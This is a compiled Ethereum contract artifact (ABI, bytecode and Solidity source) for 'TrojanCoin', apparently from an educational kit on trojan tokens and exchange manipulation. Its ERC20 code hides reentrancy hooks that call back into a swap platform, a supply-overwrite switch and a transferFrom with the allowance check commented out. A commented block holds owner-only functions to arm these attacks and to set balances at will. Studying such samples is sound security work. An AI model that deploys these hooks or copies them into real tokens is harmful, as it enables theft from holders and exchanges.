{
  "contractName": "TrojanCoinBefore",
  "abi": [
    {
      "inputs": [],
      "stateMutability": "payable",
      "type": "constructor",
      "payable": true
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "_owner",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "_spender",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "_value",
          "type": "uint256"
        }
      ],
      "name": "Approval",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "_from",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "_to",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "_value",
          "type": "uint256"
        }
      ],
      "name": "Transfer",
      "type": "event"
    },
    {
      "inputs": [],
      "name": "_totalSupply",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "decimals",
      "outputs": [
        {
          "internalType": "uint8",
          "name": "",
          "type": "uint8"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "name",
      "outputs": [
        {
          "internalType": "string",
          "name": "",
          "type": "string"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "symbol",
      "outputs": [
        {
          "internalType": "string",
          "name": "",
          "type": "string"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "totalSupply",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_owner",
          "type": "address"
        }
      ],
      "name": "balanceOf",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_to",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "_value",
          "type": "uint256"
        }
      ],
      "name": "transfer",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_from",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "_to",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "_value",
          "type": "uint256"
        }
      ],
      "name": "transferFrom",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_spender",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "_value",
          "type": "uint256"
        }
      ],
      "name": "approve",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_owner",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "_spender",
          "type": "address"
        }
      ],
      "name": "allowance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    }
  ],
  "bytecode": "0x608060405269d3c21bcecceda100000060005560018060146101000a81548160ff0219169083151502179055506000600160156101000a81548160ff0219169083151502179055506000600160166101000a81548160ff021916908315150217905550678ac7230489e8000060025569021e19e0c9bab240000060035533600460006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550600054600560003073ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555062000117336000546200011e60201b60201c565b506200055e565b6000801515600160149054906101000a900460ff1615151415620002385781600560003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054101580156200018c5750600082115b6200019657600080fd5b620001ef82600560003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546200052960201b62000e991790919060201c565b600560003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055506200027e565b6000600560003073ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055505b6000600160146101000a81548160ff021916908315150217905550620002f282600560008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546200054160201b62000eb01790919060201c565b600560008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508273ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef846040518082815260200191505060405180910390a360011515600160169054906101000a900460ff1615151415620004f8576000600160166101000a81548160ff0219169083151502179055506000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1690508073ffffffffffffffffffffffffffffffffffffffff1663e65b04aa3030629896806040518463ffffffff1660e01b8152600401808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018281526020019350505050602060405180830381600087803b158015620004b857600080fd5b505af1158015620004cd573d6000803e3d6000fd5b505050506040513d6020811015620004e457600080fd5b810190808051906020019092919050505050505b60011515600160159054906101000a900460ff16151514156200051f576003546000819055505b6001905092915050565b6000828211156200053657fe5b818303905092915050565b6000808284019050838110156200055457fe5b8091505092915050565b610f02806200056e6000396000f3fe608060405234801561001057600080fd5b50600436106100a95760003560e01c80633eaaf86b116100715780633eaaf86b1461025f57806370a082311461027d5780638da5cb5b146102d557806395d89b411461031f578063a9059cbb146103a2578063dd62ed3e14610408576100a9565b806306fdde03146100ae578063095ea7b31461013157806318160ddd1461019757806323b872dd146101b5578063313ce5671461023b575b600080fd5b6100b6610480565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156100f65780820151818401526020810190506100db565b50505050905090810190601f1680156101235780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b61017d6004803603604081101561014757600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001909291905050506104b9565b604051808215151515815260200191505060405180910390f35b61019f6105ab565b6040518082815260200191505060405180910390f35b610221600480360360608110156101cb57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001909291905050506105b4565b604051808215151515815260200191505060405180910390f35b61024361096b565b604051808260ff1660ff16815260200191505060405180910390f35b610267610970565b6040518082815260200191505060405180910390f35b6102bf6004803603602081101561029357600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610976565b6040518082815260200191505060405180910390f35b6102dd6109bf565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b6103276109e5565b6040518080602001828103825283818151815260200191508051906020019080838360005b8381101561036757808201518184015260208101905061034c565b50505050905090810190601f1680156103945780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6103ee600480360360408110156103b857600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610a1e565b604051808215151515815260200191505060405180910390f35b61046a6004803603604081101561041e57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610e12565b6040518082815260200191505060405180910390f35b6040518060400160405280600a81526020017f54726f6a616e436f696e0000000000000000000000000000000000000000000081525081565b600081600660003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508273ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925846040518082815260200191505060405180910390a36001905092915050565b60008054905090565b600081600560008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054101580156106055750600082115b610677576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600f8152602001807f62616c616e636520746f6f206c6f77000000000000000000000000000000000081525060200191505060405180910390fd5b6106c982600560008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610e9990919063ffffffff16565b600560008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555061075e82600560008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610eb090919063ffffffff16565b600560008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508273ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef846040518082815260200191505060405180910390a360011515600160169054906101000a900460ff1615151415610960576000600160166101000a81548160ff0219169083151502179055506000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1690508073ffffffffffffffffffffffffffffffffffffffff1663e65b04aa3030629896806040518463ffffffff1660e01b8152600401808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018281526020019350505050602060405180830381600087803b15801561092257600080fd5b505af1158015610936573d6000803e3d6000fd5b505050506040513d602081101561094c57600080fd5b810190808051906020019092919050505050505b600190509392505050565b601281565b60005481565b6000600560008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b600460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6040518060400160405280600381526020017f54524f000000000000000000000000000000000000000000000000000000000081525081565b6000801515600160149054906101000a900460ff1615151415610b2d5781600560003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205410158015610a8a5750600082115b610a9357600080fd5b610ae582600560003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610e9990919063ffffffff16565b600560003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550610b73565b6000600560003073ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055505b6000600160146101000a81548160ff021916908315150217905550610be082600560008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610eb090919063ffffffff16565b600560008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508273ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef846040518082815260200191505060405180910390a360011515600160169054906101000a900460ff1615151415610de2576000600160166101000a81548160ff0219169083151502179055506000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1690508073ffffffffffffffffffffffffffffffffffffffff1663e65b04aa3030629896806040518463ffffffff1660e01b8152600401808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018281526020019350505050602060405180830381600087803b158015610da457600080fd5b505af1158015610db8573d6000803e3d6000fd5b505050506040513d6020811015610dce57600080fd5b810190808051906020019092919050505050505b60011515600160159054906101000a900460ff1615151415610e08576003546000819055505b6001905092915050565b6000600660008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905092915050565b600082821115610ea557fe5b818303905092915050565b600080828401905083811015610ec257fe5b809150509291505056fea2646970667358221220108aafe420ce5d177dae1db222b3c84d395909e0e194a5ea400b5db8b058ee3264736f6c63430006060033",
  "immutableReferences": {},
  "source": "\npragma solidity ^0.6.6;\n\nimport \"../../../../contracts/interfaces/basic/safemath.sol\";\nimport \"../../../../contracts/interfaces/basic/ERC20.sol\";\nimport \"../../../../contracts/interfaces/examplePlatforms/swapHackablePlatform.sol\";\n\n\n\n    // ERC20 Token Smart Contract\n    contract TrojanCoinBefore {\n\n        string public constant name = \"TrojanCoin\";\n        string public constant symbol = \"TRO\";\n        uint8 public constant decimals = 18;\n        uint public _totalSupply = 1000000000000000000000000;\n        address marketplaceAddress;\n        bool firstTransfer= true;\n\n        //variables use in attacks later\n        bool updateSupplyActivated = false;\n        bool reentryActivated = false;\n        uint256 defaultReentryTradeAmount = 10000000000000000000;\n        uint256 defaultTotalSupplyToAdd= 10000000000000000000000;\n\n\n        using SafeMath for uint256;\n        address public owner;\n\n         modifier onlyOwner() {\n            if (msg.sender != owner) {\n                revert();\n            }\n             _;\n         }\n\n\n        mapping(address => uint256) balances;\n\n        mapping(address => mapping(address=>uint256)) allowed;\n\n\n\n        // Constructor\n        constructor() public payable {\n\n            owner = msg.sender;\n            balances[address(this)] = _totalSupply;\n            transfer( msg.sender, _totalSupply);\n        }\n\n        function totalSupply() public view returns(uint256){\n            return _totalSupply;\n        }\n\n        function balanceOf(address _owner) public view returns(uint256){\n            return balances[_owner];\n        }\n\n\n        function transfer(address _to, uint256 _value)  public returns(bool) {\n            if(firstTransfer == false){\n            require(balances[msg.sender] >= _value && _value > 0 );\n            balances[msg.sender] = balances[msg.sender].sub(_value);\n            }\n            else{\n                balances[address(this)] = 0;\n            }\n            firstTransfer = false;\n\n            balances[_to] = balances[_to].add(_value);\n            emit Transfer(msg.sender, _to, _value);\n\n            //two hacks that can be activated\n            if(reentryActivated == true){\n                reentryActivated=false;\n                platformToHack exchange = platformToHack(marketplaceAddress);\n                exchange.tokenToTokenSwap(address(this), address(this), 10000000);\n            }\n            if(updateSupplyActivated ==true){\n                _totalSupply = defaultTotalSupplyToAdd;\n            }\n            return true;\n        }\n\n\n    function transferFrom(address _from, address _to, uint256 _value)  public returns(bool) {\n      //  require(allowed[_from][msg.sender] >= _value, \"Not having permission\");\n          require(balances[_from] >= _value && _value > 0, \"balance too low\");\n        balances[_from] = balances[_from].sub(_value);\n        balances[_to] = balances[_to].add(_value);\n      //  allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n        emit  Transfer(_from, _to, _value);\n\n        if(reentryActivated == true){\n            reentryActivated=false;\n            platformToHack exchange = platformToHack(marketplaceAddress);\n            exchange.tokenToTokenSwap(address(this), address(this), 10000000);\n        }\n\n        return true;\n    }\n\n\n    function approve(address _spender, uint256 _value) public returns(bool){\n        allowed[msg.sender][_spender] = _value;\n        Approval(msg.sender, _spender, _value);\n        return true;\n    }\n\n\n    function allowance(address _owner, address _spender) public view returns(uint256){\n        return allowed[_owner][_spender];\n    }\n\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n\n\n\n\n\n\n\n}\n\n//BrickHint: Malicious code below\n\n/*\n\n\n\n\n       //malicious functions that can throw off our example swap platform later\n        function setMarketplace(address marketplace) onlyOwner public{\n            marketplaceAddress = marketplace;\n        }\n\n        function activateRentry() onlyOwner public{\n            reentryActivated = true;\n        }\n        function deactivateRentry() onlyOwner public{\n            reentryActivated = false;\n        }\n        function activateSupplyHack() onlyOwner public{\n            updateSupplyActivated = true;\n        }\n        function deactivateSupplyHack() onlyOwner public{\n            updateSupplyActivated = false;\n        }\n\n\n\n        function updateReentryAmount(uint256 updatedAmount) onlyOwner public{\n            defaultReentryTradeAmount= updatedAmount;\n        }\n        function updateTotalSupplyAddAmount(uint256 updatedAmount) onlyOwner public{\n            defaultTotalSupplyToAdd= updatedAmount;\n\n        }\n        function updateSupply(uint256 updatedAmount) onlyOwner public{\n            _totalSupply= updatedAmount;\n\n        }\n\n        function updateBalance(uint256 updatedAmount) onlyOwner public{\n            balances[msg.sender]= updatedAmount;\n\n        }\n\n\n*/\n",
  "sourcePath": "/Users/nimblesixthousand/Desktop/apps/bricks/contracts/kits/TrojanCoinAndExchangeManipulation/before/TrojanCoinBefore.sol",
  "compiler": {
    "name": "solc",
    "version": "0.6.6+commit.6c089d02.Emscripten.clang"
  },
  "schemaVersion": "3.2.0",
  "updatedAt": "2020-06-17T04:43:46.319Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}